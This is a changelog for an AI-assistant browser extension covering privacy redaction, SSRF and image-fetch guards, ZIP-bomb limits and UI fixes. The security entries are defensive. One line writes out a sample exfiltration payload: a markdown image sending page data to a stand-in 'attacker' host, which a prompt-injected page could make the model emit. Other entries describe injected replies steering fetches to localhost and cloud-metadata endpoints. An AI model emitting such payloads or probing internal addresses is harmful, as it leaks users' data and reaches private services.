# Privacy filter: misses, false positives, numbered placeholders that are restored (v1.10.91)

- **Missed (now redacted).** Bare 10-digit North American numbers (`4155550132`, also `+14155550132` which left a stray `+`) and numbers after a cue word (`Phone:`, `mobile`, `call me at`, `电话`) in any digit grouping; UK national numbers (`07911 123456`, `020 7946 0958`, `0121 496 0123`, `01632 960123`); IPv6 (full, `::`-compressed, IPv4-mapped, zone id) and MAC addresses; `SECRET_KEY=...`, `AWS_SECRET_ACCESS_KEY=...` and any key whose *name* contains secret / token / password / api key / credential; `Cookie:` / `Set-Cookie:` headers and `sessionid=`, `csrftoken=`, `JSESSIONID=` values; street addresses (US/UK style and Chinese), UK postcodes; common given name + surname without any cue ("John Smith approved ...").
- **False positives (now left alone).** The value after a key must look like a secret: `Password: required`, `secret: required`, `max token: 4096`, `max_tokens=4096`, `tokenizer: bert-base-uncased`, `api_key=your_api_key_here`, `Password: ********` are unchanged (password-style labels accept any non-placeholder value; other keys need 8+ characters mixing letters and digits, or 20+ non-letters). "Please Contact Support Team <a@b.com>" and "Contact: Support Team" are no longer treated as a person's name (role words such as support / team / service / sales are skipped, lead words like "Please contact" are kept). `12:30::`, `10:30:45`, `std::string`, order/invoice/tracking numbers are not addresses or phones.
- **Numbered placeholders, restored locally.** One request now uses `[EMAIL#1]`, `[EMAIL#2]`, `[PHONE#1]` ... (same value, same number, across question, page, history and attachments). The mapping exists only in the service worker's memory for that request; the reply (including translations, and a placeholder split across two streamed chunks) is passed through `PlaceholderRestorer`, so you see your own address instead of `[EMAIL]`. The base prompt tells the model to keep placeholders exactly as written. Locally stored history keeps the real text as before; the next request is redacted again with a fresh mapping.
- **Also fixed: slow regexes.** The e-mail and `scheme://user:pass@` rules rescanned long runs of letters from every position: a 100,000-character run with no `@` (minified code, base64) took about 5 s, now about 5 ms. 1,000,000 characters of ordinary text: 63 ms before, 85-108 ms now.
- **Tests.** `scripts/test-pii-filter.mjs` (73 checks: must-redact, must-keep, numbering, restore, streaming restore in 1-7 char pieces) and new end-to-end cases in `scripts/test-outbound-pii.mjs` (a placeholder split across chunks comes back as the real address; a translation shows the real email and phone; the provider never sees the real values). The 25-input regression corpus from earlier builds is unchanged except `api_key=sk-...`, which is now labelled `[API_KEY]` instead of `[SECRET]`.
- **Known limits.** A bare 10-digit number is treated as a phone only when it is a valid North American number and not next to an order/ID-style label; a name needs a cue or a common given name from a built-in list (English and a few international names; names that are also words or places - Mark, Will, Rose, Paris, Jordan - are left out; Chinese names without a cue are still not detected); the address rules cover common US/UK/Chinese formats only. Still a safety net, not a guarantee.
- Build bumped to 1.10.91.

# SSRF guard: compare host and port, more private suffixes (v1.10.90)

- **Bug.** `checkImageUrl` let a non-public image host through when its *hostname* matched the current page's, ignoring the port. On any `localhost:3000` page, `http://localhost:6379/...` or `:22` passed, so a prompt-injected reply could make the service worker send GET requests to any local port. Private-network suffixes such as `.corp`, `.home`, `.test` were also treated as public.
- **Fix (`url-safety.js`).** The exemption now compares `URL.host` (hostname + non-default port). Added suffixes: `.corp`, `.home`, `.private`, `.domain`, `.workgroup`, `.test`, `.example`, `.invalid`, `.ts.net`. The redirect/final-URL check in `background.js` uses the same function, so it is covered too.
- **Tested** with `scripts/test-url-safety.mjs` (37 checks: same host+port allowed, other ports/hosts/metadata endpoints blocked, public hosts incl. look-alikes such as `homeland.org` still allowed). With the old hostname comparison the port cases fail. Still true: DNS rebinding to a private address cannot be detected from an extension.
- Build bumped to 1.10.90.

# i18n: 7 missing keys filled in; key-consistency check (v1.10.89)

- **Bug.** `zh-TW`, `fr`, `ja` and `es` lacked 7 keys that `en` and `zh-CN` had (`piiFilter_label/toggle/hint`, `bg_notice_pageTruncated_template`, `bg_hint_pageTooLarge`, `imageBlockedHttp_label/open`), so those strings fell back to English - including the Privacy filter switch itself.
- **Fix (`i18n.js`).** All 7 keys added to the four languages, using each language's own wording for "Read current page".
- **Check (`scripts/check-package.mjs`).** Now also fails when a language has a key English lacks (or vice versa), a duplicate key, different `{placeholders}` than English (`{count}` is ignored on `_one` keys), or when code/HTML asks for a key that does not exist (`t(lang, "key")`, `data-i18n*="key"`). Verified on a scratch copy: a removed key, a changed placeholder and an unknown `data-i18n` key each make it exit 1. The real tree passes (6 languages x 212 keys).
- The translations are mine, not reviewed by a native speaker.
- Build bumped to 1.10.89.

# "Read current page" remembered; mail/banking pages not sent by default (v1.10.88)

- **Bug.** The side panel forced "Read current page" back to ON every time it opened (`sidepanel.js` wrote `true` to `includeCurrentPageContext` and never read it), although the comment said an opt-out was remembered. With `<all_urls>` and the Proton / MailPlus extractors, a casual question on a mail or banking page sent the whole page to the AI provider.
- **Fix.** (1) The saved choice is now read on open (default stays ON; an explicit opt-out persists). (2) New `sensitive-sites.js`: webmail and banking/payment hosts, plus any page produced by the Proton / MailPlus extractors, are not sent for ordinary questions unless the user clicks "Send this site this session" (in-memory, per host, gone when the panel closes). Quick actions are explicit and unchanged. (3) The context bar now says what will be sent ("Will send: title (host)") or that nothing will be ("Not sent: host is an email/banking site") with the allow button. Six languages; privacy policy updated (it previously said the option is switched on at every open).
- **Verified** with `scripts/test-sidepanel-context.py`: real `sidepanel.js` in Chromium with stubbed `chrome.*` - default ON, bar text, opt-out survives reopening, Gmail page not sent / allow works / allow not persisted, self-hosted mail detected via extractor source. The host list is a heuristic (it also blocks e.g. proton.me marketing pages; the allow button covers that). Not tested in a real browser profile.
- Build bumped to 1.10.88.

# Packaging: required modules tracked, import check, .gitignore (v1.10.87)

- **Issue.** `background.js` imports `pii-filter.js`, `translate-lines.js` and `url-safety.js` (and, through `settings-storage.js`, `settings-crypto.js`). If those were untracked in git, any package built from git (`git archive`, CI, a clean clone) would omit them and the service worker would fail to load. The source ZIP supplied for this build contains all four, but it has no `.git` folder, so the repository state itself could not be inspected here: run `git add` on them in your checkout (`git add pii-filter.js settings-crypto.js translate-lines.js url-safety.js`).
- **Added.** `scripts/check-package.mjs` (follows all imports from the manifest entry points, checks the manifest's icons and pages exist, and in a git checkout fails on any required file that is untracked or ignored) and `.gitignore` (zip/crx/pem/dist/node_modules/env files). The validation checklist below was out of date and now lists every runtime file.
- **Verified.** Passes on this tree (22 required files). In a throwaway git repo with the four modules left unstaged it exits 1 and names each one; after staging them it passes.
- No extension code changed. Build bumped to 1.10.87.

# Fix: initialization and port lifecycle races (v1.10.86)

- **Bugs.** (1) The `CONTEXT_ACTION` listener was live before `init()` finished, so an early context-menu action could submit and then have `init()` run `startNewTopic()`/`connectPort()` over it, wiping the new conversation or bubble. (2) `connectPort()` always created a new port, so `init()` after an earlier `ensurePort()` overwrote the global and left the first port alive. (3) A stale port's `onDisconnect` unconditionally set `port = null` and showed "connection lost", even when a newer port was current and streaming.
- **Fix (`sidepanel/sidepanel.js`).**
  - `init()` is now a named function run once as `initPromise`. The `CONTEXT_ACTION` handler waits on `initPromise`; `init()` still consumes the stored action itself, and the existing claim logic (`claimedContextActionAt`) de-duplicates the two paths.
  - `handleSubmit()` returns early until `initCoreDone` (blank topic created and port opened). The composer (input, send, quick actions, model, upload, mic) is disabled at load and re-enabled at that point, unless a request is already streaming.
  - `connectPort()` is idempotent (`if (port) return port`); `init()` calls `ensurePort()`. `postToBackground()` disconnects a dead port before reconnecting.
  - Each port's `onMessage`/`onDisconnect` closure captures `thisPort` and ignores events when `port !== thisPort`.
  - If a late `init()` step throws, the composer is not left locked.
- **Verified** with the real port functions under a stubbed `chrome.runtime`: repeated connect returns one port; a dead-port retry opens exactly one new port; messages from the old port are dropped; a stale disconnect changes nothing; the current port's disconnect still recovers the UI. Not tested in a real browser (context menu clicked during panel startup).
- Build bumped to 1.10.86.

# Fix: two side panels could silently delete each other's conversations (v1.10.85)

- **Bug.** `saveConversations()` wrote the panel's whole in-memory list. A panel that is streaming ignores `chrome.storage.onChanged`, so it never saw the other panel's saves; when its reply finished it overwrote storage with a stale array and the other panel's conversation vanished (last writer wins).
- **Fix (`sidepanel/sidepanel.js`).**
  - Before writing, a save re-reads `conversationHistory` and merges it with the in-memory list by conversation id (`mergeConversationLists()`). The conversation this panel is showing is authoritative; for any other id the copy with the newest `updatedAt` wins (ties keep the local one); conversations that exist only in storage are kept.
  - The merged list is then sorted, trimmed to `MAX_SAVED_CONVERSATIONS` and written; the quota-drop retry now halves the merged list. The panel's in-memory list is replaced by what was written, so it also picks up the other panel's conversations.
  - Saves are serialized through a promise queue (`saveQueue`), so two saves from one panel cannot interleave. A failed save still rejects to its caller but does not block later saves.
- **Verified** with the real functions under a stubbed `chrome.storage` (delayed get/set): a stale panel's save keeps the other panel's conversation, concurrent saves from two panels keep both with their newest content, a quota failure retries on the merged list and keeps the current conversation, and the queue keeps working after a failed save. Not tested with two real browser windows.
- Build bumped to 1.10.85.

# Fix: page context could come from the wrong browser window (v1.10.84)

- **Bug.** `getCurrentActiveTab()` in `sidepanel.js` returned the active tab of the globally *focused* normal window, not the window that owns the side panel. With panels open in windows A and B, focusing B and submitting from A made A read, display and send B's page, and capture B's screenshot (`captureVisibleTab` was called with B's window id). That is both a correctness and a privacy problem.
- **Fix (`sidepanel/sidepanel.js`).**
  - The panel resolves its own window once with `chrome.windows.getCurrent()` and keeps it in `panelWindowId` (`getPanelWindowId()`). A failed lookup is not cached, so the next call retries.
  - `getCurrentActiveTab()` now runs `chrome.tabs.query({ active: true, windowId: panelWindowId })`. That one tab is used for text extraction, the "page changed" re-checks, the viewport screenshot (its `windowId` is the panel's) and the `pageUrl` passed with page images and click-to-load images.
  - If the window is known but the query fails or finds no tab, the result is `null` (no page context). It never falls back to another window.
  - Only when the window lookup itself fails does it use the previous focused-window logic (`getFocusedWindowActiveTab()`).
  - `tabs.onActivated`, `tabs.onUpdated` and `windows.onFocusChanged` ignore events from other windows (`isOwnWindowEvent()`), so a tab switch or focus change elsewhere no longer refreshes this panel. When the window is unknown they behave as before.
  - `consumePendingContextAction()` reuses `getPanelWindowId()` instead of its own `getCurrent()` call (same behaviour).
- Build bumped to 1.10.84.

# ZIP / text attachments: no silent skips, ignore list, GBK (v1.10.83)

- **The entry limit counts text files only.** `MAX_ZIP_ENTRIES` (80) was checked against every entry of the ZIP, directories and images included, and rejected the whole archive above it. It now limits the text files that are actually read; directories, images and other non-text entries do not count, and text files past the limit are left out and reported instead of failing the attachment. The unused `sp_zip_error_tooManyFiles_template` string was removed.
- **Ignore list.** Text files under `node_modules`, `bower_components`, `.git`, `.svn`, `.hg`, `.idea`, `__pycache__`, `.venv`, `venv`, `.next`, `.nuxt` and `__MACOSX`, minified bundles (`*.min.js`, `.mjs`, `.cjs`, `.css`) and lock files (`package-lock.json`, `pnpm-lock.yaml`, `*.lock`, `go.sum`, ...) are not read. The list is `ZIP_IGNORED_DIRS` and `zipIgnoreReason()` in `sidepanel.js`; matching is by whole path segment, so `node_modules.txt` or `.gitignore` are not affected.
- **Nothing is skipped or cut silently any more.** `extractZipText()` returns `{ text, report }`. Text files that were too large (over 720 KB uncompressed, `MAX_ZIP_ENTRY_BYTES`), not read because the 80-file or 180,000-character limit was reached, cut at that limit, unreadable (unsupported compression, damaged entry) or ignored are counted per category. The attachment chip gets a second line ("Not fully included — Truncated 1 · Over limit 14 · Ignored 120 (node_modules/, .git/)"); its tooltip lists the file names and the limits. An English `===== ZIP NOTE =====` block at the start of the attachment text tells the model that the archive is partial; it sits at the start so the 4,000-character preview that history keeps still contains it. A plain text file cut at 180,000 characters gets the same chip line and a `[NOTE: ...]` line. If nothing could be read, the error says why ("... — Ignored 2 (node_modules/)") instead of only "no text files". Images and other non-text entries are never listed as skipped.
- **The ZIP loop no longer stops at the character limit.** It keeps walking the directory (cheap header parsing; at most 80 entries are ever inflated) so the left-out files can be counted. A ZIP with 60,000 entries is processed in about 0.2 s.
- **GBK / GB18030 text.** Attachments were decoded with `file.text()` (UTF-8 only), so GBK files (Windows Notepad, Excel's CSV export) came out as mojibake. `decodeTextBytes()` decodes as UTF-8 first; if the result contains U+FFFD and the bytes are not valid UTF-8, it retries with `TextDecoder("gb18030")` in fatal mode and uses that result only if the whole file decodes. Valid UTF-8 that merely contains a U+FFFD character is left alone. It is used for plain text attachments and for the contents of ZIP entries (entry names are unchanged). This is a heuristic: a UTF-8 file of only a few characters that also contains invalid bytes can be misread.
- New `attachment_note_*` strings in all six languages. The chip note is rebuilt in the current language when the interface language changes. `.attachment-note` / `.attachment.has-note` styles added to `sidepanel.css`.
- Behaviour change: ZIPs with more than 80 entries used to be rejected; they are now read, and only text files beyond the 80th are left out (and reported).
- Build bumped to 1.10.83.

# Privacy filter: Canadian SIN, business number, date of birth, postal code (v1.10.82)

- **Gap.** Testing showed these were sent unredacted: Canadian SIN (`046 454 286`, `046454286`), CRA business number (`123456789 RT0001`), a date after "Date of birth:", and Canadian postal codes (`M5V 3L9`). New rules in `pii-filter.js`:
  - `[SIN]` - 9 digits, solid or grouped 3-3-3 with the same space/hyphen, **Luhn-checked**, so ordinary 9-digit numbers are left alone. The first digit is not restricted (046 454 286 is a valid SIN). Not matched inside longer digit/letter runs or as a decimal (`046454286.50`).
  - `[BUSINESS_NUMBER]` - `\d{9}\s?RT\d{4}` (GST/HST account), case-insensitive. Runs before the SIN rule.
  - `[DATE_OF_BIRTH]` - only the date that follows a birth label (Date of birth, Birth date, Birthday, DOB / D.O.B., Born / Born on, 出生日期, 出生年月(日), 出生时间, 生日, 出生于, 出生). The label stays: `Date of birth: [DATE_OF_BIRTH]`. Date forms: `1985-03-12` / `1985/03/12` / `1985.03.12`, `03/12/1985`, `March 12, 1985`, `12 March 1985`, `1985年3月12日`. A date with no label is never touched. Runs before the name rules so a name rule cannot swallow the "Date" of the label.
  - `[POSTAL_CODE]` - `A1A 1A1` / `A1A1A1` / `A1A-1A1`, using the real letter restrictions (never D F I O Q U W Z first; never D F I O Q U in the other slots), case-insensitive.
- **Not covered (unchanged):** street addresses and names that have no cue such as "Name:" ("John Smith approved..."). Detecting those reliably needs more than patterns and would redact ordinary text. Known trade-off: any standalone letter-digit-letter-digit-letter-digit token (e.g. a product code `A1B2C3`) is read as a postal code, and about 1 in 10 random 9-digit numbers pass the Luhn check and are read as a SIN.
- Checked with a script: every reported example is redacted; look-alikes (Luhn-invalid 9 digits, unlabelled dates, "born in 1985", invalid postal letters) are left alone; 25 inputs from the existing categories give byte-identical output to 1.10.81; about 25 ms for a 1,000,000-character page. The Settings hint text and privacy policy list categories only as examples, so they were not changed.
- Build bumped to 1.10.82.

# Delete All History now also resets an open side panel (v1.10.81)

- **Bug.** Settings > Delete All History removes `conversationHistory` from storage, but an already-open side panel kept its current conversation in memory. The next send wrote it straight back (`syncCurrentConversationFromHistory`), so the "All history deleted" message was not true for that panel. A request still streaming at that moment could also re-create the history when its reply finished.
- **Fix (`sidepanel/sidepanel.js`).** The existing `chrome.storage.onChanged` listener for the history key now detects removal (the change has no `newValue`) and resets the panel the same way the Clear button does: stop dictation, `stopActiveRequest()` (so an in-flight reply cannot re-save), then `startNewTopic()`. The listener's normal refresh then empties the in-memory list and the history dropdown. Panels in other windows react the same way. Settings > Restore and the panel's own saves always write an array, so they do not trigger the reset. The old comment that described the stale panel as expected behaviour was updated.
- Checked in Chromium with stubbed `chrome.*` APIs against the real `sidepanel.js`: with the old code the deleted conversation stayed on screen and came back on the next send (and after a late reply); with the fix the panel shows a blank New Topic, storage holds only new messages, and replacing history (Restore) leaves the displayed conversation alone. Not tested in a real browser profile.
- Build bumped to 1.10.81.

# Settings page: remove duplicate divider lines (v1.10.80)

- Between "Web Research" and "Privacy filter", and between "Privacy filter" and "Page screenshot and images", the settings page drew two horizontal lines (a `.settings-divider` element plus the next section's own top border). The two redundant `.settings-divider` elements were removed so each gap has a single line. The divider between "Page screenshot and images" and "Custom Prompt" is unchanged.
- Build bumped to 1.10.80.

# Settings page: toggle alignment + clearer screenshot wording (v1.10.79)

- **Alignment fix (`options/options.html`).** The "Privacy filter" and "Page screenshot and images" checkboxes had no styling on the settings page, so the global `label { display: block }` / `input { width: 100% }` rules stretched each checkbox to full width and stacked it above its text. `label.toggle` now lays the checkbox and its wording out on one line (checkbox aligned to the first line of text); long wording in any language wraps under itself instead of overflowing.
- **Clearer wording (`i18n.js`).** The Chinese "Page screenshot and images" toggle (Simplified and Traditional) now says that, besides the page text, quick actions also send a screenshot of the visible area and some page images. Behaviour is unchanged.
- Build bumped to 1.10.79.

# One system message only (v1.10.78)

- `buildMessages()` used to append two or three extra `system` messages after the conversation history (page-context state, a repeated language guard, and for translations the translation protocol). Strict chat templates (some Qwen builds, certain OpenRouter backends) reject a `system` message that is not first. There is now exactly one `system` message, at the start; the per-request instructions are placed at the very start of the current user turn inside an `[INSTRUCTIONS FOR THIS REQUEST ...]` block, before the untrusted page-data block (whose random boundary the page cannot forge). Verified on the real function for page on/off/capture-failed/translate modes: system count 1, first message is system, roles alternate, the instruction block precedes the page data and the question is last. Not tested against a live Qwen/OpenRouter request.
- Build bumped to 1.10.78.

# Privacy fixes: remote images, privacy filter false positives, page screenshots (v1.10.77)

- **Remote images in replies are no longer loaded automatically.** A prompt-injected page could make the model emit `![](https://attacker/?d=<page data>)` and the panel would request it as soon as the reply rendered. The panel CSP is now `img-src 'self' data:`; every remote image is shown as a placeholder (with its URL) and is fetched through the worker (`FETCH_IMAGE`, public hosts only, type/size checked) only when the user clicks it. Loaded images are cached for the session so streaming re-renders keep them. The old http-image fallback code was removed.
- **Privacy filter false positives (`pii-filter.js`).** The "my name is / this is" rule ran with the `i` flag, so `[A-Z]` matched any letter: "This is very important for the project." became "This is [NAME] project." That rule is now case-sensitive and "this is" was dropped. Greetings (Hello/Hi/Dear) take at most two capitalised words and skip generic targets (World, Everyone, Customer Support...). Version numbers ("Version 1.2.3.4") are not treated as IP addresses. Chinese titles only match after a common surname (王先生, 李经理), not any word before 老师/经理/医生. Known limit: "my name is john smith" in lowercase is not redacted.
- **Page screenshot and images are opt-in.** Images cannot be run through the text filter, so the quick actions no longer attach a viewport screenshot and page images unless Settings > "Page screenshot and images" is on (off by default). Images the user attaches are unchanged. `piiFilterEnabled` and `pageVisualsEnabled` are now included in the settings export/import.
- `privacy-policy.md` now describes quick actions reading the page, the screenshot option, the privacy filter and click-to-load images.
- Build bumped to 1.10.77.

# Quick Translate follows the preferred translation language (v1.10.76)

- The Translate quick action used to always ask for Chinese. It now uses Settings > Preferred Translation Language (default English), the same as the right-click menu. The API prompt names the language in English; the chat bubble shows it in the display language. `quickTranslate_prompt` in all six languages takes a `{language}` placeholder; the language lookup is shared (`getPreferredTranslationLanguage()` in `sidepanel.js`).
- Behaviour change: users who never set the preference now get English instead of Chinese.
- Build bumped to 1.10.76.

# Page size budget per model + clearer too-large errors (v1.10.75)

- **Per-model cap:** `models.js` now has `maxPageChars` (DeepSeek 120,000 chars; Groq and OpenRouter-free 24,000, roughly 6k tokens). Longer page text is cut at a line boundary in the worker and the panel shows a "page shortened" notice bubble.
- **Translation is not truncated** (a cut translation would silently miss the rest); it relies on the error hint.
- **Clear error:** when a request that carried page text fails with HTTP 413/429, "too large", rate-limit or context-length errors, the provider message is followed by a hint to turn off "Read current page", select just the text needed, wait, or switch model.
- Build bumped to 1.10.75.

# Blocked http images show a placeholder (v1.10.74)

- Plain `http:` images are still blocked by the CSP (no security change). When the https retry also fails (http-only hosts such as a NAS, LAN device or localhost), the broken-image icon is replaced by "Image blocked (http)" plus the alt text and an Open link to the original URL, instead of an unexplained broken icon. https image failures are unchanged.

# Fix: message listeners piled up on re-injection (v1.10.73)

- `content.js` is injected on demand, and each injection into a tab ran in the same isolated world and added another `onMessage` listener; after N injections one request ran the extractor N times. The previous listener (kept on `globalThis.__aiAssistantMessageListener`) is now removed before the new one is added, and the stale comment (which still described a manifest content script) was rewritten.

# Translation: the format was being lost BEFORE the model (v1.10.72)

- **Real root cause:** the page extractor (`content.js`) flattened the page to plain text: heading levels, bullets/numbering, tables, links, bold and code blocks were gone before the text reached the model, and the noise filter even dropped titles inside `<header>`. No prompt or renderer could restore that.
- **New structure-preserving extractor (`extractPageMarkdownContent`, `extractSelectionMarkdown`):** for Translate the page (or the right-click selection) is converted DOM -> Markdown: `#` headings, nested `-`/`1.` lists with start numbers, `|` tables, fenced code, `>` quotes, `**bold**`, `*italic*`, `[links](url)`, images. Titles in `<header>` are kept; only scripts, menus, ads and hidden elements are skipped.
- `translate-lines.js` keeps all of that in code (markers, indentation, code blocks, images, URLs, inline code are never sent to the model; URLs/code are swapped for `{{Un}}` tokens and restored). The model translates only the words.
- The side panel renders markdown translations (and now supports nested lists and ordered-list start numbers); plain selections keep exact whitespace.
- Build bumped to 1.10.72.

# Translation: layout preserved by code, not by the model (v1.10.71)

- **Why again:** prompting (v1.10.68) and plain-text rendering (v1.10.70) still left the layout to the model, which merges lines, drops markers and rewrites structure.
- **New `translate-lines.js`:** for Translate (quick action and context menu) the source is split into lines; blank lines, indentation, list markers/numbering (`1.`, `-`, `•`, `#`, `>`) and letter-less lines (separators, bare numbers) never go to the model. Only the text of each remaining line is sent as `[n] text`, and the streamed `[n] translation` lines are re-assembled around the original structure. Missing lines fall back to the original text, extra commentary is dropped, so the output always has the same line layout as the source.
- Context-menu translation now sends the exact selected text (`translateSource`); web research is skipped for translations.
- Build bumped to 1.10.71.

# Translation format fix, round 2 (v1.10.70)

- **Root cause:** v1.10.68 only changed the prompt. The reply was still run through the Markdown renderer, which renumbers lists, merges consecutive lines into one paragraph, drops indentation and turns `*`, `_`, `#`, `>` and `|` in the source into formatting. So even a perfect translation was displayed with a different layout.
- **Fix:** translation replies (Translate quick action and context-menu translate) are now rendered as plain text with `white-space: pre-wrap`, streamed and restored from history the same way (`plain: true` on the stored turn). The system prompt now asks for line-for-line plain text with no added Markdown. Context-menu text is sent on its own lines after the instruction instead of being glued to it.
- Build bumped to 1.10.70.

# Privacy filter before sending to AI (v1.10.69)

- **New `pii-filter.js`:** the worker redacts the question (including attachment text), page title/URL/text and conversation history locally before building any provider or Tavily request. Covers emails, phone numbers (CN/US/international), credit cards (Luhn-checked), CVV, SSN, CN ID numbers, IBAN, IPv4, private keys, JWTs, API keys (OpenAI/Anthropic/GitHub/AWS/Google/Stripe/Slack/Groq/Tavily...), Bearer tokens, `password=`/`token=` values, URL credentials and secret query params, and names that follow a clear cue (`Name:`, `My name is`, `Dear`, `Mr.`, `姓名`, `我叫`, email display names).
- Replaced by placeholders like `[EMAIL]`; local history keeps the originals. Images are not filtered. If filtering throws, the request is not sent.
- **Setting:** Settings > Privacy filter (on by default).
- Build bumped to 1.10.69.

# Strict-format translation + "Read current page" always on (v1.10.68)

- **Translation keeps the source format:** Quick-action Translate and the context-menu "Translate selected text" now send a `translateMode` flag; the worker adds a mandatory system instruction (`TRANSLATION_FORMAT_INSTRUCTION`) requiring only the translation, with the same line breaks, paragraphs, headings, lists, tables, code and links, and no preface or commentary.
- **"Read current page" on by default:** it is checked every time the panel opens; a saved opt-out is no longer restored (it only lasts until the panel closes).
- **Build number:** bump the patch version in `manifest.json` (and add a README entry) on every build.

# Narrower injection + stricter image CSP (v1.10.67)

- **No global content script:** `content_scripts` (`<all_urls>`, every page load) is removed from `manifest.json`. `content.js` is injected on demand by the side panel with `chrome.scripting.executeScript` only when "Read current page" or a quick action needs the page (this path already existed as the fallback). Pages no longer pay any load-time cost.
- **`host_permissions` kept on purpose:** `activeTab` is granted only by a user gesture on the toolbar icon/context menu and only for that tab, but the panel reads whichever tab becomes active (tab switch, auto-refresh), takes screenshots with `captureVisibleTab`, and the worker fetches page images. Without host access these break on any tab the user hasn't just clicked the icon on. Making it `optional_host_permissions` would be a possible follow-up at the cost of a permission prompt.
- **CSP:** `img-src` is now `'self' data: https:` (no plaintext `http:`). An `http:` image that fails to load is retried through the worker over `https:` only.

# Sender validation + "Read current page" on by default (v1.10.66)

- **Sender checks:** `content.js` (`EXTRACT_PAGE_CONTENT`) and the side panel (`CONTEXT_ACTION`) now verify `sender.id === chrome.runtime.id`, that the sender carries no `tab`, and that its URL is a `chrome-extension://` page of this extension. `background.js` already enforced this through `isOwnExtensionPage()`.
- **Default:** the "Read current page" checkbox is checked by default (HTML and stored-preference fallback); an explicit opt-out is still remembered.

# Multi-window fix: one window could cancel another window's keep-alive and reset its conversation pointer (v1.10.65)

**Problem:** the service worker is one process shared by every browser window, but two pieces of `background.js` state were treated as if each request or panel owned them.
1. **Keep-alive timer.** There was a single global `keepAliveTimer`. Each question started it (replacing any running one) and each finishing question cleared it. With two windows streaming at once, the first to finish - or to have its panel closed, which aborts its request - cleared the only timer, so the other window's request lost its keep-alive and could be cut off by the worker's ~30 s idle timeout.
2. **Current-conversation pointer.** Every port disconnect unconditionally wrote `currentConversationId = ""`. Closing the panel in window A reset the pointer that window B was still using.

**Fixed (`background.js`):**
- **Shared, reference-held keep-alive:** every in-flight question takes one hold and releases it in its `finally` block; the timer runs while any hold exists and is cleared only when the last one is released. The release function is idempotent, and it is called unconditionally, including when a newer question on the same port has already replaced `activeRequestId` (STOP followed immediately by a new question). Simply counting requests would have leaked a hold in that case and kept the worker alive indefinitely.
- **Pointer cleared only by the last panel:** the worker tracks its connected side-panel ports and resets the pointer only when the last one disconnects. Aborting a disconnected port's own in-flight request is unchanged and still unconditional. With one window open, behaviour is exactly as before.

**Verified** by loading the real `background.js` under a stubbed `chrome` API (instrumented timers, a controllable streaming `fetch`, one mock port per window). On the previous build 4 of 10 scenarios fail (A finishes while B streams: 0 timers left instead of 1; A's panel closed while B streams: 0 instead of 1; A's panel closed: B's pointer wiped; a reconnected panel). On this build all 10 pass, including: a single request still starts and stops its timer, the error path releases it, STOP-then-immediate-ASK neither leaks nor stops early, the timer tick really calls the extension API, closing the last panel still clears the pointer, and a lone panel behaves as before. Real service-worker termination cannot be reproduced from this sandbox, so a real two-window test in the browser is still worthwhile.

**Known limits / not changed:** the pointer is still a single storage key shared by all windows, and the side panel itself writes it too (`startNewTopic()` on every panel open, `selectConversation()`), so it remains "last writer wins" across windows. Nothing currently reads it back with activation (both `loadConversations()` callers pass `activate: false`; each panel shows its conversation from memory), so this has no visible effect today. Making it per-window would be a larger change with no consumer. A panel that has no live port (after a worker restart, until its next question) is not counted as connected.

# Security fix: history restore could be crashed by a ZIP bomb (v1.10.64)

**Problem:** restoring a history backup in Settings (`options.js` -> `extractZipEntries`) inflated Deflate entries with `new Response(stream).arrayBuffer()`, which buffers the whole output with no ceiling. The side panel's ZIP reader already capped decompression and cancelled the stream when the cap was hit; the Settings page did not. The sizes in a ZIP header are attacker-controlled and were only compared *after* the data was already in memory, so a small, highly compressed archive could exhaust memory and crash the Settings tab. The stored (no-compression) path was exposed too: up to 200 central-directory entries may point at the same bytes, multiplying memory use without any compression.

**Measured before the fix:** a 306 KB archive of zero bytes was accepted and pushed the process to about 1.3 GB (a copy with a falsified header was rejected only after about 1 GB was allocated), and a 21 MB archive of overlapping stored entries crashed the process outright.

**Fixed (`options/options.js`, `i18n.js`):**
- **Bounded streaming inflate:** new `inflateRawLimited()` reads the Deflate stream chunk by chunk, stops as soon as the output passes its limit and calls `reader.cancel()`. The limit for each entry is its *declared* size, so a header that understates the real size is caught immediately instead of after the fact.
- **Budget checked before any data is touched:** an entry may expand to at most 32 MiB and all entries together to at most 64 MiB. The total is a running sum, which is what stops overlapping-entries archives. A genuine backup is bounded by the `chrome.storage.local` quota (about 10 MB of history), so real backups are nowhere near these limits.
- **No copy of the compressed bytes:** entry data is read through a `subarray()` view instead of `slice()`.
- New error string `zip_error_expandedTooLarge` in all six languages.

**Verified** against the real `extractZipEntries` extracted from `options.js`: the 306 KB zero-byte bomb, the falsified-header bomb, a total-budget bomb (3 x 30 MiB) and the overlapping-stored bomb are all rejected, each in under 0.4 s and with peak memory of at most 195 MB (the two bombs that fail on their header alone stay under 50 MB); the exporter's own stored ZIP, a realistic Deflate backup, an empty entry and an entry of exactly 32 MiB still restore; 32 MiB + 1, a declared size that is too small or too large, and corrupt Deflate data are all rejected cleanly. Not tested in a real browser from this sandbox - worth one real Backup -> Restore round trip in Settings.

**Not changed:** `sidepanel/sidepanel.js` already had the cap (`inflateRaw`) and was left as is. Restore still reads every entry in the archive even though only `conversation-history.json` is used; skipping the others would be a further reduction in work but changes which malformed archives are tolerated.

# Security hardening: the background worker is no longer an open fetch proxy (v1.10.63)

**Problem:** the service worker holds the extension's `<all_urls>` host permission, but its `FETCH_IMAGE` / `FETCH_PAGE_IMAGES` handlers checked only that a URL was `http(s)` and did not check who was asking. Image URLs come from web pages (`<img>` tags) and from model replies (which a page can steer by prompt injection), so the worker could be pointed at `localhost` services, router admin pages or cloud-metadata endpoints (`169.254.169.254`). The handlers also accepted SVG, trusted the declared `Content-Type`, and read the whole body into memory with no timeout.

**Fixed (`background.js`, new `url-safety.js`):**
- **Sender check:** the message and `ai-chat` port handlers only serve the extension's own pages (side panel, settings, mic tab). Content scripts, which share the extension id but run inside web pages, are rejected. (Ordinary page scripts could not reach the worker before either - the manifest has no `externally_connectable`.)
- **Destination check:** only public internet hosts. Blocked: `localhost`, loopback, RFC 1918 / CGNAT / link-local (incl. `169.254.169.254`) / reserved IPv4 in any spelling (`2130706433`, `0x7f000001`, `127.1`), private/loopback/link-local/mapped/NAT64/6to4 IPv6, single-label and `.local`/`.lan`/`.internal`/`.intranet`/`.home.arpa` names, common wildcard-DNS names (`*.nip.io`, ...) and URLs with embedded credentials. **Exception:** a non-public host is allowed when it is the same host as the page the user is currently viewing, so images on an intranet/localhost page keep working there.
- **Redirects:** the final URL is re-checked and the response discarded if it landed on a disallowed host.
- **Limits:** 10-second timeout; byte cap enforced while streaming (a lying or missing `Content-Length` can no longer force a huge download); the body must have a real PNG/JPEG/GIF/WebP/BMP signature, and the data URL carries the real type.
